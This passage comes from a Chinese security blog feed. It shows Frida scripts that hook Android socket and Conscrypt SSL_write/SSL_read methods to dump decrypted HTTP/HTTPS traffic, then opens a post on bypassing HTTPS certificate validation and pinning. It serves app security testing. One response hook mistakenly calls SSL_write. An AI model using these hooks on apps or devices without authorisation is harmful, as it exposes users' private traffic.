class="params">fd,bytes,off,len,timeout</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Intercepted socket read&quot;</span>);                              </span><br><span class="line">        <span class="comment">//打印了客户端和服务端地址</span></span><br><span class="line">        <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(remoteAddress +<span class="string">&quot;&lt;====&quot;</span>+ localAddress)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印了读取的数据</span></span><br><span class="line">        <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">showStacks</span>() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用该函数，可以实现将内存中的 byte 转换为 String</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印它的调用栈</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281029679.png" alt="image.png"> </p><h2 id="3-HTTPS-Request"><a href="#3-HTTPS-Request" class="headerlink" title="3. HTTPS Request"></a>3. HTTPS Request</h2><h3 id="实现https请求"><a href="#实现https请求" class="headerlink" title="实现https请求"></a>实现https请求</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://www.taobao.com</span></span><br><span class="line">private <span class="keyword">void</span> <span class="title function_">httpsock</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        final <span class="title class_">String</span> host = <span class="string">&quot;www.taobao.com&quot;</span>;</span><br><span class="line">        final int port = <span class="number">18080</span>;</span><br><span class="line">        final <span class="title class_">String</span> path = <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这块使用SSL来传输数据</span></span><br><span class="line">        <span class="title class_">SSLSocketFactory</span> sslSocketFactory = (<span class="title class_">SSLSocketFactory</span>) <span class="title class_">SSLSocketFactory</span>.<span class="title function_">getDefault</span>();</span><br><span class="line">        <span class="title class_">SSLSocket</span> socket = (<span class="title class_">SSLSocket</span>) sslSocketFactory.<span class="title function_">createSocket</span>(host,port);</span><br><span class="line">        <span class="comment">//Socket socket = new Socket(host,port);</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">StringBuilder</span> sb = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="title class_">Log</span>.<span class="title function_">d</span>(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="title class_">OutputStream</span> outputStream = socket.<span class="title function_">getOutputStream</span>();</span><br><span class="line">        outputStream.<span class="title function_">write</span>(sb.<span class="title function_">toString</span>().<span class="title function_">getBytes</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title class_">InputStream</span> inputStream = socket.<span class="title function_">getInputStream</span>();</span><br><span class="line">        byte[] buffer = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        int len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.<span class="title function_">read</span>(buffer,<span class="number">0</span>,buffer.<span class="property">length</span>) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            <span class="title class_">Log</span>.<span class="title function_">d</span>(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="title class_">Arrays</span>.<span class="title function_">copyOf</span>(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="title class_">Exception</span> e)&#123;</span><br><span class="line">        e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281030342.png" alt="image.png"> </p><p>运行程序，可以看到成功实现了https的socket请求和返回。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281031758.png" alt="image.png"> </p><h3 id="源码跟踪"><a href="#源码跟踪" class="headerlink" title="源码跟踪"></a>源码跟踪</h3><p>根据demo可以看到，处理加上了一层SSLSocket，剩下的发送和接收的代码相较于http都是没有改动的。</p><p>所以，这块request的代码还是：  outputStream.write</p><p>该位置打断点，查看 outputStream 在此处的实现类为 ：<strong>ConscryptFileDescriptorSocket$SSLOutputStream</strong>，这块的SSLOutputStream为内部类。。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032721.png" alt="image.png"> </p><p>检索 ConscryptFileDescriptorSocket类，没有找到。猜测可能是系统中的某个类。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032526.png" alt="image.png"> </p><p>可以通过网页查找： <a href="http://aospxref.com/android-8.1.0_r81/">http://aospxref.com/android-8.1.0_r81/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032948.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033011.png" alt="image.png"> </p><p>这块传入的参数是一个数组。但是没有在SSLOutputStream这个内部类中找到，说明没有对这个方法进行重写，所以，直接查看 OutputStream中的write方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033266.png" alt="image.png"> </p><p>这块调用的是三个参数的write方法，也就是<strong>SSLOutputStream</strong>中的write方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033554.png" alt="image.png"> </p><p>调用了 ssl.write(Platform.getFileDescriptor(socket), buf, offset, byteCount,writeTimeoutMilliseconds);   传入了5个参数。</p><p>跳转，可以看到实际是调用了<strong>SslWraper</strong>这个类中的write方法。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034406.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void write(FileDescriptor fd, byte[] buf, int offset, int len, int timeoutMillis)  throws IOException &#123;</span><br><span class="line">    NativeCrypto.SSL_write(ssl, fd, handshakeCallbacks, buf, offset, len, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034593.png" alt="image.png"> </p><p>这块最终是到了 NativeCrypto.SSL_write 方法，这个方法是Native类中的了，到此就可以了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034646.png" alt="image.png"> </p><p>总结一下，整体的一个outputStream.write的调用链为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">outputStream.write--&gt;ConscryptFileDescriptorSocket$SSLOutputStream(实现类)--&gt;SSLOutputStream.write(内部类)--&gt;SslWraper.write--&gt;NativeCrypto.SSL_write(Native层)</span><br></pre></td></tr></table></figure><h3 id="Frida-Hook-Https-request"><a href="#Frida-Hook-Https-request" class="headerlink" title="Frida Hook Https-request"></a>Frida Hook Https-request</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044922.png" alt="image.png"> </p><p>运行后，发现报错？？？？提示找不到这个 “org.conscrypt.NativeCrypto” 这个类。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044395.png" alt="image.png"> </p><p>猜测，NativeCrypto这个类的包名可能有问题，一般类加载到内存中后，包名可能发生变化。</p><p>java文件中NativeCrypto类的包名为 “org.conscrypt”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044407.png" alt="image.png"> </p><p>这块可以使用objection，查看内存中加载的类名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android   hooking search classes NativeCrypto</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281045082.png" alt="image.png"> </p><p>修改全类名为 “com.android.org.conscrypt.NativeCrypto”，成功打印出请求的数据和调用堆栈。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281045251.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印它的调用栈</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="4-HTTPS-Response"><a href="#4-HTTPS-Response" class="headerlink" title="4. HTTPS Response"></a>4. HTTPS Response</h2><h4 id="Frida-Hook-Https-response"><a href="#Frida-Hook-Https-response" class="headerlink" title="Frida Hook Https-response"></a>Frida Hook Https-response</h4><p>同理，根据上面的调用链，可以得到response的最终调用方法为：<strong>NativeCrypto.SSL_read</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281047029.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印它的调用栈</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">SSL_write</span>.<span class="title function_">call</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281047167.png" alt="image.png"> </p><h4 id="打印https的local和remote地址"><a href="#打印https的local和remote地址" class="headerlink" title="打印https的local和remote地址"></a>打印https的local和remote地址</h4><p>根据之前http打印地址的方法，可以看到是调用了<strong>this.socket</strong>的方法来打印的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var localAddress = this.socket.value.getLocalAddress().toString()</span><br><span class="line">var remoteAddress = this.socket.value.getRemoteSocketAddress().toString()</span><br></pre></td></tr></table></figure><p>但在 NativeCrypto 类中没有找到socket方法。</p><p>继续向前看，可以看到在 “SSLOutputStream.write” 方法里面，使用ssl.write的时候，是有socket的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281048626.png" alt="image.png"> </p><p>只不过，这块将 Platform.getFileDescriptor(socket) 作为了ssl.write的一个参数，这块<strong>Platform.getFileDescriptor函数</strong>，是一个文件的描述符。可以理解为C语言中的open函数，打开了一个文件，返回了一个文件操作符。。。这块想要拿到它的参数 “socket” ，就是我们的目的。</p><p>这块Frida提供了API接口：”Socket”，它里面有定义一些方法，可以获取地址：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281048364.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Socket.localAddress(handle)</span><br><span class="line">Socket.peerAddress(handle)</span><br></pre></td></tr></table></figure><p>那么问题来了？这块的handle参数到底是什么？</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049952.png" alt="image.png"> </p><p>确定参数类型，这块是要输入一个int数字number。。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function(sslNativePointer,fd,shc, bytes,off,len,timeout)</span><br></pre></td></tr></table></figure><p>function中传入参数有7个，但其中关于参数 “fd” 的描述是： <strong>FileDescriptor fd</strong>（文件描述符）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049281.png" alt="image.png"> </p><p>查找 FileDescriptor 类，发现里面是有一个**getInt$()**的系统方法，是可以获取Descriptor的数值的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049665.png" alt="image.png"> </p><p>直接hook，打印：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049289.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049925.png" alt="image.png"> </p><h2 id="5-整合HTTP-HTTPS代码如下"><a href="#5-整合HTTP-HTTPS代码如下" class="headerlink" title="5. 整合HTTP+HTTPS代码如下"></a>5. 整合HTTP+HTTPS代码如下</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start hooking http/https request/response&quot;</span>);</span><br><span class="line">        <span class="comment">//Hook http request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook http response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_read</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将内存中的 byte 转换为 String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印它的调用栈</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印http请求的地址</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpAddr</span>(<span class="params">socket,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = socket.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = socket.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send http request to &quot;</span> + remoteAddress + <span class="string">&quot; from &quot;</span> + localAddress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv http response from &quot;</span> + remoteAddress + <span class="string">&quot; to &quot;</span> + localAddress);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印https请求的地址</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpsAddr</span>(<span class="params">fd,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send https request to &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; from &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv https response from &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; to &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R0Capture </tag>
            
            <tag> APP抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android HTTPS防抓包策略总结</title>
      <link href="/2024/06/20/HTTPS%E9%98%B2%E6%8A%93%E5%8C%85%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/20/HTTPS%E9%98%B2%E6%8A%93%E5%8C%85%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在对移动App安全测试时，通常第一步是对App的网络请求报文进行抓包。因为App客户端可以实现对HTTPS证书进行校验以防止抓包，为了对抗证书校验，一般会采用信任代理工具签发的证书、安装插件绕过证书检测等方法。</p><p>本文将对常用的证书校验方式及相应的对抗方法做个简单总结。</p><h1 id="0x02-了解HTTPS证书"><a href="#0x02-了解HTTPS证书" class="headerlink" title="0x02 了解HTTPS证书"></a>0x02 了解HTTPS证书</h1><p>在HTTPS握手建立链接时，会使用非对称算法协商通讯使用的加密密钥。非对称加密算法需要两个密钥：公钥和私钥。</p><p>通常所说的HTTPS证书就可以理解为公钥，为了确保客户端收到的证书的真实性，于是诞生了CA机构，CA机构颁发的证书也叫CA证书，防止CA证书被伪造，同时避免套娃，因此在操作系统中内置了一个信任库，里面保存了可信任的CA证书集合，也称为系统根证书，用于校验服务端返回的证书的真实性。在Android系统中，可以点击 设置-系统安全-加密与凭据-信任的凭据查看默认信任的CA证书。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201108503.png" alt="image-20240620110802431"> </p><h1 id="0x03-证书校验-对抗"><a href="#0x03-证书校验-对抗" class="headerlink" title="0x03 证书校验&amp;对抗"></a>0x03 证书校验&amp;对抗</h1><p>在使用HTTPS协议进行网络通讯时，对HTTPS证书校验有多种处理方式，包括</p><ul><li>忽略证书链校验</li><li>系统证书链校验</li><li>证书绑定（SSL Pinning，代码校验和配置文件绑定）</li><li>双向校验等方式</li></ul><p>下面介绍下APP实现每种校验方法，以及相应的破解方法。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201111264.png" alt="image-20240620111149218"> </p><h2 id="1-忽略证书校验"><a href="#1-忽略证书校验" class="headerlink" title="1. 忽略证书校验"></a>1. 忽略证书校验</h2><p>在对HTTPS证书验证时，可以通过代码实现信任所有证书（这种也就是相当于没有任何的校验，直接正常抓包即可），以OkHttp网络框架为例，发起一个忽略HTTPS证书校验的请求实现如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* https协议</span></span><br><span class="line"><span class="comment">* 忽略证书验证</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mHttpsConnectTrustButton = findViewById(R.id.httpsConnectTrust);</span><br><span class="line">mHttpsConnectTrustButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">OkHttpClient</span> <span 